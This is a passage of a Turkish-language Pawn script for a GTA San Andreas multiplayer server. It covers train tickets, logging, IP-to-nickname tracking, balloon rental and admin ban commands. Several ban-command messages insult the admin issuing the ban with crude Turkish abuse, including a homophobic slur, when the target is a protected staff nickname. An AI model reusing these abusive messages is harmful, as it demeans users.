			SendClientMessage(playerid, -1, "{FF0000}Bilet alabilmek için Tren seferleri bilet alma bölgesinde olmalýsýnýz.");
 		}
   	}
	else if (strcmp("sf-ls", cmd, true, 10) == 0)
	{
		if(PlayerToPointStripped(3, playerid, -1972.3527,117.4383,27.6940,cx,cy,cz ))//SFLS SFLV
		{
			Bilet[playerid] = 6;
			SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Bileti aldýn.San Fierro - Los Santos Trenine binerek gidebilirsin.");
		}
		else
		{
			SendClientMessage(playerid, -1, "{FF0000}Bilet alabilmek için Tren seferleri bilet alma bölgesinde olmalýsýnýz.");
 		}
   	}
	else if (strcmp("sf-lv", cmd, true, 10) == 0)
	{
		if(PlayerToPointStripped(3, playerid, -1972.3527,117.4383,27.6940,cx,cy,cz ))//SFLS SFLV
		{
			Bilet[playerid] = 5;
			SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Bileti aldýn.San Fierro - Las Venturas Trenine binerek gidebilirsin.");
		}
		else
		{
			SendClientMessage(playerid, -1, "{FF0000}Bilet alabilmek için Tren seferleri bilet alma bölgesinde olmalýsýnýz.");
 		}
   	}
    return 1;
}

public LSSFTreni(arabaid)
{
for(new i = 0; i<sizeof(NPCLSSF); i++)
{
	if(arabaid == NPCLSSF) return 1;
}
return 0;
}

public LSLVTreni(arabaid)
{
for(new i = 0; i<sizeof(NPCLSLV); i++)
{
	if(arabaid == NPCLSLV) return 1;
}
return 0;
}

public LVLSTreni(arabaid)
{
for(new i = 0; i<sizeof(NPCLVLS); i++)
{
	if(arabaid == NPCLVLS) return 1;
}
return 0;
}

public LVSFTreni(arabaid)
{
for(new i = 0; i<sizeof(NPCLVSF); i++)
{
	if(arabaid == NPCLVSF) return 1;
}
return 0;
}


public SFLVTreni(arabaid)
{
for(new i = 0; i<sizeof(NPCSFLV); i++)
{
	if(arabaid == NPCSFLV) return 1;
}
return 0;
}


public SFLSTreni(arabaid)
{
for(new i = 0; i<sizeof(NPCSFLS); i++)
{
	if(arabaid == NPCSFLS) return 1;
}
return 0;
}

public PlayerToPointStripped(Float:radi, playerid, Float:x, Float:y, Float:z, Float:curx, Float:cury, Float:curz)
{
    if(IsPlayerConnected(playerid))
	{
		new Float:tempposx, Float:tempposy, Float:tempposz;
		tempposx = (curx -x);
		tempposy = (cury -y);
		tempposz = (curz -z);
		if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi))) return 1;
	}
	return 0;
}

// ************************************************************************************************************************************************************
// Günlük Log Sistemi [ EvoturK ]
// ************************************************************************************************************************************************************
LOG(msg[])
{
	new g, a, y, sa, d, sn, logtext[400], filename[100];
	getdate(y, a, g); gettime(sa, d, sn);

	format(logtext, 400, "%d:%d:%d | %s\r\n", sa, d, sn, msg);
	format(filename, 100, "ServerData/Log/%d.%d.%d Log.txt", g, a, y);

	new File:logfile = fopen(filename, io_append);
	fwrite(logfile, logtext);
	fclose(logfile);
	return 1;
}

BANLOG(msg[])
{
	new g, a, y, sa, d, sn, logtext[500], filename[100];
	getdate(y, a, g); gettime(sa, d, sn);

	format(logtext, 500, "Tarih %d/%d/%d  Saat %d:%d:%d | %s\r\n", g, a, y, sa, d, sn, msg);
	format(filename, 100, "ServerData/Log/BanLog.txt");

	new File:logfile = fopen(filename, io_append);
	fwrite(logfile, logtext);
	fclose(logfile);
	return 1;
}

BATTLELOG(msg[])
{
	new g, a, y, sa, d, sn, logtext[500], filename[100];
	getdate(y, a, g); gettime(sa, d, sn);

	format(logtext, 500, "Tarih %d/%d/%d  Saat %d:%d:%d | %s\r\n", g, a, y, sa, d, sn, msg);
	format(filename, 100, "ServerData/Log/GorevLog.txt");

	new File:logfile = fopen(filename, io_append);
	fwrite(logfile, logtext);
	fclose(logfile);
	return 1;
}

CAHITLOG(msg[])
{
	new g, a, y, sa, d, sn, logtext[500], filename[100];
	getdate(y, a, g); gettime(sa, d, sn);

	format(logtext, 500, "Tarih %d/%d/%d  Saat %d:%d:%d | %s\r\n", g, a, y, sa, d, sn, msg);
	format(filename, 100, "ServerData/Log/CahitLog.txt");

	new File:logfile = fopen(filename, io_append);
	fwrite(logfile, logtext);
	fclose(logfile);
	return 1;
}

ISYERILOG(msg[])
{
	new g, a, y, sa, d, sn, logtext[500], filename[100];
	getdate(y, a, g); gettime(sa, d, sn);

	format(logtext, 500, "Tarih %d/%d/%d  Saat %d:%d:%d | %s\r\n", g, a, y, sa, d, sn, msg);
	format(filename, 100, "ServerData/Log/Isyerilog.txt");

	new File:logfile = fopen(filename, io_append);
	fwrite(logfile, logtext);
	fclose(logfile);
	return 1;
}


ISYERIALMA(msg[])
{
	new g, a, y, sa, d, sn, logtext[500], filename[100];
	getdate(y, a, g); gettime(sa, d, sn);

	format(logtext, 500, "Tarih %d/%d/%d  Saat %d:%d:%d | %s\r\n", g, a, y, sa, d, sn, msg);
	format(filename, 100, "ServerData/Log/Isyerialma.txt");

	new File:logfile = fopen(filename, io_append);
	fwrite(logfile, logtext);
	fclose(logfile);
	return 1;
}

EVLOG(msg[])
{
	new g, a, y, sa, d, sn, logtext[500], filename[100];
	getdate(y, a, g); gettime(sa, d, sn);

	format(logtext, 500, "Tarih %d/%d/%d  Saat %d:%d:%d | %s\r\n", g, a, y, sa, d, sn, msg);
	format(filename, 100, "ServerData/Log/Evsatma.txt");

	new File:logfile = fopen(filename, io_append);
	fwrite(logfile, logtext);
	fclose(logfile);
	return 1;
}



// ************************************************************************************************************************************************************
// AKA Sistemi [ EvoturK ]
// ************************************************************************************************************************************************************
LoadAKA(playerid)
{
	if(strlen(dini_Get("ServerData/aka.txt", GetIP2(playerid))) == 0) dini_Set("ServerData/aka.txt", GetIP2(playerid), GetName(playerid));
 	else
	{
	    if( strfind( dini_Get("ServerData/aka.txt", GetIP2(playerid)), GetName(playerid), true) == -1 )
		{
			new string[40];
		    format(string,sizeof(string),"%s,%s", dini_Get("ServerData/aka.txt",GetIP2(playerid)), GetName(playerid));
		    dini_Set("ServerData/aka.txt", GetIP2(playerid), string);
		}
	}
}


CMD:aka(playerid, params[])
{
	new PlayerToAka;

	SendAdminText(playerid, "/aka", params);

	if (APlayerData[playerid][LoggedIn] == true)
	{
		if (APlayerData[playerid][PlayerLevel] >= 1 || Root[playerid] == 1)
		{
			if (sscanf(params, "u", PlayerToAka)) SendSyntaxMessage(playerid, "/aka <ID>");
			else
				if (IsPlayerConnected(PlayerToAka))
				{
					new AKAYazi[300];
    				new AKA[256]; AKA = dini_Get("ServerData/aka.txt", GetIP2(PlayerToAka));
					format(AKAYazi, 300, "{FF0000}%s{F8F8FF}'in AKA'sý: {FF0000}%s", GetName(PlayerToAka), AKA);
					SendClientMessage(playerid, -1, AKAYazi);
				}
				else
				    SendClientMessage(playerid, 0xFF0000FF, "That player isn't online");
		}
		else
		    return 0;
	}
	else
	    return 0;

	return 1;
}
///The function: HGS
/*forward OnDriverGetMoney(playerid);
public OnDriverGetMoney(playerid)
{
    if (IsPlayerInRangeOfPoint(playerid, 5.0, 524.7834, 695.2776, 3.4381))
    {
        RewardPlayer(playerid, -200, 0);
        SendClientMessage(playerid,0xFFFFFFFF,"HGS: 200$ Ödediniz, Iyi yolculuklar!");
        GameTextForPlayer(playerid,"~w~HGS 200$ Dikatli surunuz!",4500,3);
        //KillTimer(MoneyTimer[playerid]);
        //MoneyTimer[playerid] = -1;
    }
    else if (IsPlayerInRangeOfPoint(playerid, 5.0, 528.4603, 703.1720, 3.3147))
    {
        RewardPlayer(playerid, -200, 0);
        GameTextForPlayer(playerid,"~w~HGS 200$ Dikatli surunuz!",4500,3);
        SendClientMessage(playerid,0xFFFFFFFF,"HGS: 200$ Ödediniz, Iyi yolculuklar!");
        //KillTimer(MoneyTimer[playerid]);
        //MoneyTimer[playerid] = -1;
    }
     else if (IsPlayerInRangeOfPoint(playerid, 5.0, 1632.4761, -13.2057, 36.6718))
    {
        RewardPlayer(playerid, -200, 0);
        GameTextForPlayer(playerid,"~w~HGS 200$ Dikatli surunuz!",4500,3);
        SendClientMessage(playerid,0xFFFFFFFF,"HGS: 200$ Ödediniz, Iyi yolculuklar!");
        //KillTimer(MoneyTimer[playerid]);
        //MoneyTimer[playerid] = -1;
    }
     else if (IsPlayerInRangeOfPoint(playerid, 5.0, 1641.5310, -9.8691, 36.6123))
    {
        RewardPlayer(playerid, -200, 0);
        GameTextForPlayer(playerid,"~w~HGS 200$ Dikatli surunuz!",4500,3);
        SendClientMessage(playerid,0xFFFFFFFF,"HGS: 200$ Ödediniz, Iyi yolculuklar!");
        //KillTimer(MoneyTimer[playerid]);
        //MoneyTimer[playerid] = -1;
    }
    return 1;
}*/
public PingCheck()
{
    for(new i; i<MAX_PLAYERS; i++)
    {
    	if(!IsPlayerConnected(i)) continue;
    	if(APlayerSpawnData[i] == false) continue;
	    new ping = GetPlayerPing(i),name[MAX_PLAYER_NAME],string[128];
	    GetPlayerName(i,name,sizeof(name));
	    if(ping > 1500)
	    {
	        format(string,sizeof(string),"[ANTI PING] %s Yüksek Ping (%d) nedeniyle sunucudan atýldý.",name,ping);
	        SendClientMessageToAll(0xFF0000FF,string);
	        SafeKick(i);
	    }
	}
    return 1;
}

forward Firework(i);
public Firework(i)
{
        new Float:x, Float:y, Float:z;
        x = nx[i];
        y = ny[i];
        z = nz[i];
        z += RocketHeight;
        if (RocketExplosions[i] == 0)
        {
            DestroyDynamicObject(Rocket[i]);
            DestroyDynamicObject(RocketLight[i]);
            DestroyDynamicObject(RocketSmoke[i]);
            CreateExplosion(x ,y, z, 4, 10);
            CreateExplosion(x ,y, z, 5, 10);
            CreateExplosion(x ,y, z, 6, 10);
        }
        else if (RocketExplosions[i] >= MAX_FIREWORKS)
        {
            for (new j = 0; j <= RocketSpread; j++)
            {
                CreateExplosion(x + float(j - (RocketSpread / 2)), y, z, 7, 10);
                CreateExplosion(x, y + float(j - (RocketSpread / 2)), z, 7, 10);
                CreateExplosion(x, y, z + float(j - (RocketSpread / 2)), 7, 10);
            }
            RocketExplosions[i] = -1;
            FireworkTotal = 0;
            Fired = 0;
            return 1;
        }
        else
        {
                x += float(random(RocketSpread) - (RocketSpread / 2));
                y += float(random(RocketSpread) - (RocketSpread / 2));
                z += float(random(RocketSpread) - (RocketSpread / 2));
            CreateExplosion(x, y, z, 7, 10);
        }
        RocketExplosions[i]++;
        SetTimerEx("Firework", 250, 0, "i", i);
        return 1;
}

// ************************************************************************************************************************************************************
// AirBalloon Sistemi
// ************************************************************************************************************************************************************
// /balon
CMD:balon(playerid, params[])
{
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, -1, "{FF0000}Araç içindeyken bu komutu kullanamazsýnýz!");
	if(Balonda[playerid] == true) return SendClientMessage(playerid, -1, "{FF0000}Þuan zaten balondasýnýz. Balondan F tuþuna basarak ayrýlabilirsiniz.");
	if(!IsPlayerInRangeOfPoint(playerid, 3.0, 263.5667,-1863.8475,2.8567) && VIP[playerid] == 0 && YVIP[playerid] == 0) return SendClientMessage(playerid, -1, "{FF0000}Balon kiralama yerinde deðilsiniz! Los Santos Santa Maria Beach'te balon kiralayabilirsiniz!");
	if(APlayerData[playerid][PlayerMoney] < 5000 && VIP[playerid] == 0) return SendClientMessage(playerid, -1, "{FF0000}Balon kiralamak için 5000$'a ihtiyacýnýz var!");
	BalonVer(playerid);
	if(VIP[playerid] == 0 && YVIP[playerid] == 0)
	{
		RewardPlayer(playerid, -5000, 0);
		SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}5000$'a balon kiraladýnýz. F tuþuna basarak balondan inebilirsiniz.");
	}else{
	    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}VIP olduðunuz için ücretsiz balon kiraladýnýz. F tuþuna basarak balondan inebilirsiniz.");
	}
	return 1;
}

// BalonVer
BalonVer(playerid)
{
	if(Balonda[playerid] == true) return 0;
	new Float:oX, Float:oY, Float:oZ;
	GetPlayerPos(playerid, oX, oY, oZ);

	Balonda[playerid] = true;

	BalonObje[playerid][0] = CreateObject(((random(7))+19332),oX,oY,oZ,0.0,0.0,0.0,300.0);  //balloon
	BalonObje[playerid][1] = CreateObject(18692,0.0,0.0,0.0,0.0,0.0,0.0,300.0);    //fire 1
	BalonObje[playerid][2] = CreateObject(18692,0.0,0.0,0.0,0.0,0.0,0.0,300.0);    //fire 2
    AttachObjectToObject(BalonObje[playerid][1], BalonObje[playerid][0], 0.0, 0.0, 4.0, 0.0, 0.0, 0.0, 1);
    AttachObjectToObject(BalonObje[playerid][2], BalonObje[playerid][0], 0.0, 0.0, 2.0, 0.0, 0.0, 0.0, 1);

	AttachObjectToPlayer(BalonObje[playerid][0],playerid,0.0,0.0,-1.0,0.0,0.0,0.0);   //attach balloon to player
  	SetPlayerSpecialAction(playerid, 2);
	return 1;
}

// BalonSil
BalonSil(playerid)
{
	if(Balonda[playerid] == false) return 0;
	Balonda[playerid] = false;
	DestroyObject(BalonObje[playerid][0]);
	DestroyObject(BalonObje[playerid][1]);
	DestroyObject(BalonObje[playerid][2]);
  	SetPlayerSpecialAction(playerid, 0);
	return 1;
}

// ************************************************************************************************************************************************************
// MySQL Ban Sistemi [ EvoturK ]
// ************************************************************************************************************************************************************
/*
enum BanReasonInfo
{
	BRName[40],
	BRGun
};

new BanReason[4][BanReasonInfo]={
//Sebep                                 Süre(Gün)
{"Hile Kullanýmý", 						1},
{"Þahýsa Küfür", 						1},
{"Ailevi Küfür", 						3},
{"Admine Saygýsýzlýk/Hakaret",			2}
};
*/
// /ban
CMD:ban(playerid, params[])
{
	new PlayerToBan, Gun, Saat, Reason[128], Yazi[1000];

	SendAdminText(playerid, "/ban", params);

	if (APlayerData[playerid][LoggedIn] == true)
	{
		if (APlayerData[playerid][PlayerLevel] >= 3 || Root[playerid] == 1)
		{
			if (sscanf(params, "uiis[128]", PlayerToBan, Gun, Saat, Reason))
			{
				SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}/ban {FFCC00}[Oyuncu ID/Nick][Gün][Saat][Sebep]");
			}else{
				if (IsPlayerConnected(PlayerToBan))
				{
					if(Gun < 0 || Saat < 0) return SendClientMessage(playerid, -1, "Gün ve saati 0'ýn altýnda bir deðer giremezsiniz!");
   				    if(IsPlayerNPC(PlayerToBan)) return SendClientMessage(playerid, -1, "NPC'yi bu þekilde banlayamazsýn yiðen");
					if(!strcmp("NicqsiZAcent", GetName(PlayerToBan), true)) return SendClientMessage(playerid, -1, "{FF0000}Evo Hoca'yý sen kim oluyon da banlýyon gavat!");
                    if(!strcmp("TeaMStar", GetName(PlayerToBan), true)) return SendClientMessage(playerid, -1, "{FF0000}Umut Hoca'yý sen kim oluyon da banlýyon gavat Oglu Gavat!");
					if(!strcmp("Tiger", GetName(PlayerToBan), true)) return SendClientMessage(playerid, -1, "{FF0000}Arda Hoca'yý sen kim oluyon da banlýyon ibine!");
				    if(APlayerData[PlayerToBan][PlayerLevel] >= APlayerData[playerid][PlayerLevel]) return SendClientMessage(playerid, -1, "{FF0000}Kendinizden yüksek levelli yöneticilere bu komutu uygulayamazsiniz!");

					new day, month, year, hour, minute, second;
					getdate(year, month, day);
					gettime(hour, minute, second);
					#pragma unused second
					hour += Saat;
					if(hour >= 24)
					{
					    hour -= 24;
						day++;
					}
					day += Gun;
					AyKontrol(day, month, year);

					format(Yazi, 1000, "{FFCC00}» {FFFFFF}ADMIN %s %s{F8F8FF}'yi %i gün %i Saat banladý {FF0000}[ %s ]", GetName(playerid), GetName(PlayerToBan), Gun, Saat, Reason);
					SendClientMessageToAll(0x808080FF, Yazi);
					new Yazi2[1024];
					format(Yazi2, 1000, "~r~~h~ADMIN %s %s~w~'yI %i gun %i Saat banladI ~r~~h~( %s )", GetName(playerid), GetName(PlayerToBan), Gun, Saat, Reason);
					SendDuyuruText(Yazi2);

					format(Yazi, 1000, "{FF4040}=============[OYUNDAN YASAKLANDINIZ]=============\n", Yazi);
					format(Yazi, 1000, "%s\n", Yazi);
					format(Yazi, 1000, "%s{DDDDDD}Yasaklayan: {48D1CC}%s\n", Yazi, GetName(playerid));
					format(Yazi, 1000, "%s{DDDDDD}Sebep: {48D1CC}%s\n", Yazi, Reason);
					format(Yazi, 1000, "%s{DDDDDD}Süre: {48D1CC}%d Gün %d Saat\n", Yazi, Gun, Saat);
					format(Yazi, 1000, "%s{DDDDDD}Bitiþ: {48D1CC}%d.%d.%d Saat %d:%d\n", Yazi, day, month, year, hour, minute);
					format(Yazi, 1000, "%s\n", Yazi);
					format(Yazi, 1000, "%s{DDDDDD}Suçsuz yere oyundan yasaklandýysanýz kanýtý ile\n", Yazi);
					format(Yazi, 1000, "%s{ADFF2F}Canakkale Meslek.com {DDDDDD}de itirazda bulunabilirsiniz.\n", Yazi);
					format(Yazi, 1000, "%s\n", Yazi);
    				format(Yazi, 1000, "%s{FF4040}=================================================\n", Yazi);
    				ShowPlayerDialog(PlayerToBan, 9999, DIALOG_STYLE_MSGBOX, "{FFCC00}» {FFFFFF}Canakkale Meslek Yönetim", Yazi, "Kapat", "");

					new handle = SQL::Open(SQL::INSERT, "yasaklilar");
    				SQL::WriteString(handle, "Nick", GetName(PlayerToBan));
    				SQL::WriteString(handle, "Banlayan", GetName(playerid));
    				SQL::WriteString(handle, "Sebep", Reason);
    				SQL::WriteInt(handle, "Sonlu", 1);
    				SQL::WriteInt(handle, "BitisGun", day);
    				SQL::WriteInt(handle, "BitisAy", month);
    				SQL::WriteInt(handle, "BitisYil", year);
    				SQL::WriteInt(handle, "BitisSaat", hour);
    				SQL::WriteInt(handle, "BitisDakika", minute);
   					SQL::Close(handle);

					format(Yazi, 1000, "[BAN] %s(%d) %s(%d)'i %d gün %d saat banladý. Sebep: %s", GetName(playerid), playerid, GetName(PlayerToBan), PlayerToBan, Gun, Saat, Reason);
					LOG(Yazi);

					format(Yazi, 1000, "[BAN] %s(%d) %s(%d)'i %d gün %d saat banladý. Sebep: %s", GetName(playerid), playerid, GetName(PlayerToBan), PlayerToBan, Gun, Saat, Reason);
					BANLOG(Yazi);
					format(Yazi, 1000, "%s Banlandi: %d gün %d saat Sebep: %s.", GetName(PlayerToBan), Gun, Saat, Reason);
					SqlLogYaz(playerid, 1, Yazi);


					SafeKick(PlayerToBan);
				}
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	return 1;
}

// /banid
CMD:banid(playerid, params[])
{
	new PlayerToBan, Reason, Yazi[1000];

	SendAdminText(playerid, "/banid", params);

	if (APlayerData[playerid][LoggedIn] == true)
	{
		if (APlayerData[playerid][PlayerLevel] >= 3 || Root[playerid] == 1)
		{
			if (sscanf(params, "ui", PlayerToBan, Reason))
			{
				SendClientMessage(playerid, -1, "{DDDDDD}Kullaným: {20B2AA}/banid {FFC000}[ Oyuncu ID/Nick ][ Sebep No ]");
				SendClientMessage(playerid, -1, "{F8F8FF}Ban Sebep Numaralarý:");
				for(new i; i < sizeof(BanReason); i++)
				{
					format(Yazi, 1000, "{FF0000}%d# {F8F8FF}%s", i+1, BanReason[i][BRName]);
					SendClientMessage(playerid, -1, Yazi);
				}
			}else{
				if (IsPlayerConnected(PlayerToBan))
				{
					if(Reason < 1 || Reason > sizeof(BanReason)) return SendClientMessage(playerid, -1, "{FF0000}Lütfen Ban Sebep No'yu düzgün girin!");
   				    if(IsPlayerNPC(PlayerToBan)) return SendClientMessage(playerid, -1, "NPC'yi bu þekilde banlayamazsýn yiðen");
					if(!strcmp("NicqsiZAcent", GetName(PlayerToBan), true)) return SendClientMessage(playerid, -1, "{FF0000}Evo Hoca'yý sen kim oluyon da banlýyon gavat!");
                    if(!strcmp("TeaMStar", GetName(PlayerToBan), true)) return SendClientMessage(playerid, -1, "{FF0000}Umut Hoca'yý sen kim oluyon da banlýyon gavat Oglu Gavat!");
					if(!strcmp("Tiger", GetName(PlayerToBan), true)) return SendClientMessage(playerid, -1, "{FF0000}Arda Hoca'yý sen kim oluyon da banlýyon ibine!");
				    if(APlayerData[PlayerToBan][PlayerLevel] >= APlayerData[playerid][PlayerLevel]) return SendClientMessage(playerid, -1, "{FF0000}Kendinizden yüksek levelli yöneticilere bu komutu uygulayamazsiniz!");

					new day, month, year, hour, minute, second;
					getdate(year, month, day);
					gettime(hour, minute, second);
					#pragma unused second
					day += BanReason[Reason-1][BRGun];
					AyKontrol(day, month, year);

					format(Yazi, 1000, "{FF0000}ADMIN %s %s{F8F8FF}'yi %i gün banladý {FF0000}[ %s ]", GetName(playerid), GetName(PlayerToBan), BanReason[Reason-1][BRGun], BanReason[Reason-1][BRName]);
					SendClientMessageToAll(0x808080FF, Yazi);
					new Yazi2[1024];
					format(Yazi2, 1000, "~r~~h~ADMIN %s %s ~w~'yI %i gun banladI ~r~~h~( %s )", GetName(playerid), GetName(PlayerToBan), BanReason[Reason-1][BRGun], BanReason[Reason-1][BRName]);
					SendDuyuruText(Yazi2);

					format(Yazi, 1000, "{FF4040}=============[OYUNDAN YASAKLANDINIZ]=============\n", Yazi);
					format(Yazi, 1000, "%s\n", Yazi);
					format(Yazi, 1000, "%s{DDDDDD}Yasaklayan: {48D1CC}%s\n", Yazi, GetName(playerid));
					format(Yazi, 1000, "%s{DDDDDD}Sebep: {48D1CC}%s\n", Yazi, BanReason[Reason-1][BRName]);
					format(Yazi, 1000, "%s{DDDDDD}Süre: {48D1CC}%d Gün\n", Yazi, BanReason[Reason-1][BRGun]);
					format(Yazi, 1000, "%s{DDDDDD}Bitiþ: {48D1CC}%d.%d.%d Saat %d:00\n", Yazi, day, month, year, hour);
					format(Yazi, 1000, "%s\n", Yazi);
					format(Yazi, 1000, "%s{DDDDDD}Suçsuz yere oyundan yasaklandýysanýz kanýtý ile\n", Yazi);
					format(Yazi, 1000, "%s{ADFF2F}Canakkale Meslek.com {DDDDDD}de itirazda bulunabilirsiniz.\n", Yazi);
					format(Yazi, 1000, "%s\n", Yazi);
    				format(Yazi, 1000, "%s{FF4040}=================================================\n", Yazi);
    				ShowPlayerDialog(PlayerToBan, 9999, DIALOG_STYLE_MSGBOX, "{FFCC00}» {FFFFFF}Canakkale Meslek Sunucusu Yönetim", Yazi, "Kapat", "");

					new handle = SQL::Open(SQL::INSERT, "yasaklilar");
    				SQL::WriteString(handle, "Nick", GetName(PlayerToBan));
    				SQL::WriteString(handle, "Banlayan", GetName(playerid));
    				SQL::WriteString(handle, "Sebep", BanReason[Reason-1][BRName]);
    				SQL::WriteInt(handle, "Sonlu", 1);
    				SQL::WriteInt(handle, "BitisGun", day);
    				SQL::WriteInt(handle, "BitisAy", month);
    				SQL::WriteInt(handle, "BitisYil", year);
    				SQL::WriteInt(handle, "BitisSaat", hour);
    				SQL::WriteInt(handle, "BitisDakika", minute);
   					SQL::Close(handle);

					format(Yazi, 1000, "[BAN] %s(%d) %s(%d)'i %d gün banladý. Sebep: %s", GetName(playerid), playerid, GetName(PlayerToBan), PlayerToBan, BanReason[Reason-1][BRGun], BanReason[Reason-1][BRName]);
					LOG(Yazi);

					format(Yazi, 1000, "[BAN] %s(%d) %s(%d)'i %d gün banladý. Sebep: %s", GetName(playerid), playerid, GetName(PlayerToBan), PlayerToBan, BanReason[Reason-1][BRGun], BanReason[Reason-1][BRName]);
					BANLOG(Yazi);
					format(Yazi, 1000, "%s Banlandi: %d gün Sebep: %s.", GetName(PlayerToBan), BanReason[Reason-1][BRGun], BanReason[Reason-1][BRName]);
					SqlLogYaz(playerid, 1, Yazi);

					SafeKick(PlayerToBan);
				}
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	return 1;
}


CMD:hban(playerid, params[])
{
	new PlayerToBan, Reason, Yazi[1000];

	SendAdminText(playerid, "/hban", params);

	if (APlayerData[playerid][LoggedIn] == true)
	{
		if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
		{
			if (sscanf(params, "ui", PlayerToBan, Reason))
			{
				SendClientMessage(playerid, -1, "{DDDDDD}Kullaným: {20B2AA}/ban {FFC000}[ Oyuncu ID/Nick ][ Sebep No ]");
				SendClientMessage(playerid, -1, "{F8F8FF}Ban Sebep Numaralarý:");
				for(new i; i < sizeof(BanReason); i++)
				{
					format(Yazi, 1000, "{FF0000}%d# {F8F8FF}%s", i+1, BanReason[i][BRName]);
					SendClientMessage(playerid, -1, Yazi);
				}
			}else{
				if (IsPlayerConnected(PlayerToBan))
				{
					if(Reason < 1 || Reason > sizeof(BanReason)) return SendClientMessage(playerid, -1, "{FF0000}Lütfen Ban Sebep No'yu düzgün girin!");
   				    if(IsPlayerNPC(PlayerToBan)) return SendClientMessage(playerid, -1, "NPC'yi bu þekilde banlayamazsýn yiðen");
					if(!strcmp("Tiger", GetName(PlayerToBan), true)) return SendClientMessage(playerid, -1, "{FF0000}Evo Hoca'yý sen kim oluyon da banlýyon gavat!");
                    if(!strcmp("TeaMStar", GetName(PlayerToBan), true)) return SendClientMessage(playerid, -1, "{FF0000}Umut Hoca'yý sen kim oluyon da banlýyon gavat Oglu Gavat!");
                   	if(!strcmp("MaWixXx", GetName(PlayerToBan), true)) return SendClientMessage(playerid, -1, "{FF0000}Arda Hoca'yý sen kim oluyon da banlýyon gavat Oglu Gavat!");
                   	if(!strcmp("NicqsiZAcent", GetName(PlayerToBan), true)) return SendClientMessage(playerid, -1, "Boþ Mesaj");
					if(APlayerData[PlayerToBan][PlayerLevel] >= APlayerData[playerid][PlayerLevel]) return SendClientMessage(playerid, -1, "{FF0000}Kendinizden yüksek levelli yöneticilere bu komutu uygulayamazsiniz!");

					new day, month, year, hour, minute, second;
					gettime(hour, minute, second);
					#pragma unused second
					getdate(year, month, day);
					day += BanReason[Reason-1][BRGun];
					AyKontrol(day, month, year);


					format(Yazi, 1000, "{FF0000}ADMIN %s %s{F8F8FF}'yi %i gün banladý {FF0000}[ %s ]", GetName(playerid), GetName(PlayerToBan), BanReason[Reason-1][BRGun], BanReason[Reason-1][BRName]);
					SendClientMessageToAll(0x808080FF, Yazi);

					format(Yazi, 1000, "{FF4040}=============[OYUNDAN YASAKLANDINIZ]=============\n", Yazi);
					format(Yazi, 1000, "%s\n", Yazi);
					format(Yazi, 1000, "%s{DDDDDD}Yasaklayan: {48D1CC}%s\n", Yazi, GetName(playerid));
					format(Yazi, 1000, "%s{DDDDDD}Sebep: {48D1CC}%s\n", Yazi, BanReason[Reason-1][BRName]);
					format(Yazi, 1000, "%s{DDDDDD}Süre: {48D1CC}%d Gün\n", Yazi, BanReason[Reason-1][BRGun]);
					format(Yazi, 1000, "%s{DDDDDD}Bitiþ: {48D1CC}%d.%d.%d Saat %d:00\n", Yazi, day, month, year, hour);
					format(Yazi, 1000, "%s\n", Yazi);
					format(Yazi, 1000, "%s{DDDDDD}Suçsuz yere oyundan yasaklandýysanýz kanýtý ile\n", Yazi);
					format(Yazi, 1000, "%s{ADFF2F}Canakkale Meslek.com {DDDDDD}de itirazda bulunabilirsiniz.\n", Yazi);
					format(Yazi, 1000, "%s\n", Yazi);
    				format(Yazi, 1000, "%s{FF4040}=================================================\n", Yazi);
    				ShowPlayerDialog(PlayerToBan, 9999, DIALOG_STYLE_MSGBOX, "{FFCC00}» {FFFFFF}Canakkale Meslek Sunucusu Yönetim", Yazi, "Kapat", "");

					new handle = SQL::Open(SQL::INSERT, "yasaklilar");
    				SQL::WriteString(handle, "Nick", GetName(PlayerToBan));
    				SQL::WriteString(handle, "Banlayan", GetName(playerid));
    				SQL::WriteString(handle, "Sebep", BanReason[Reason-1][BRName]);
    				SQL::WriteInt(handle, "Sonlu", 1);
    				SQL::WriteInt(handle, "BitisGun", day);
    				SQL::WriteInt(handle, "BitisAy", month);
    				SQL::WriteInt(handle, "BitisYil", year);
    				SQL::WriteInt(handle, "BitisSaat", hour);
    				SQL::WriteInt(handle, "BitisDakika", minute);

   					SQL::Close(handle);

					format(Yazi, 1000, "[BAN] %s(%d) %s(%d)'i %d gün banladý. Sebep: %s", GetName(playerid), playerid, GetName(PlayerToBan), PlayerToBan, BanReason[Reason-1][BRGun], BanReason[Reason-1][BRName]);
					LOG(Yazi);

					format(Yazi, 1000, "[BAN] %s(%d) %s(%d)'i %d gün banladý. Sebep: %s", GetName(playerid), playerid, GetName(PlayerToBan), PlayerToBan, BanReason[Reason-1][BRGun], BanReason[Reason-1][BRName]);
					BANLOG(Yazi);
					format(Yazi, 1000, "%s Banlandi: %d gün Sebep: %s.", GetName(PlayerToBan), BanReason[Reason-1][BRGun], BanReason[Reason-1][BRName]);
					SqlLogYaz(playerid, 1, Yazi);

					SafeKick(PlayerToBan);
				}
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	return 1;
}

// /sban
CMD:sban(playerid, params[])
{
	new PlayerToBan, Reason[128], Yazi[1000];

	SendAdminText(playerid, "/sban", params);

	if (APlayerData[playerid][LoggedIn] == true)
	{
		if (APlayerData[playerid][PlayerLevel] >= 6 || Root[playerid] == 1)
		{
			if (sscanf(params, "us[128]", PlayerToBan, Reason))
			{
				SendClientMessage(playerid, -1, "{DDDDDD}Kullaným: {20B2AA}/sban {FFC000}[ Oyuncu ID/Nick ][ Sebep ]");
			}else{
				if (IsPlayerConnected(PlayerToBan))
				{
   				    if(IsPlayerNPC(PlayerToBan)) return SendClientMessage(playerid, -1, "NPC'yi bu þekilde banlayamazsýn yiðen");
					if(!strcmp("TeaMStar", GetName(PlayerToBan), true)) return SendClientMessage(playerid, -1, "{FF0000}Evo Hoca'yý sen kim oluyon da banlýyon gavat!");
                    if(!strcmp("Tiger", GetName(PlayerToBan), true)) return SendClientMessage(playerid, -1, "{FF0000}Sedo Hoca'yý sen kim oluyon da banlýyon gavat Oglu Gavat!");
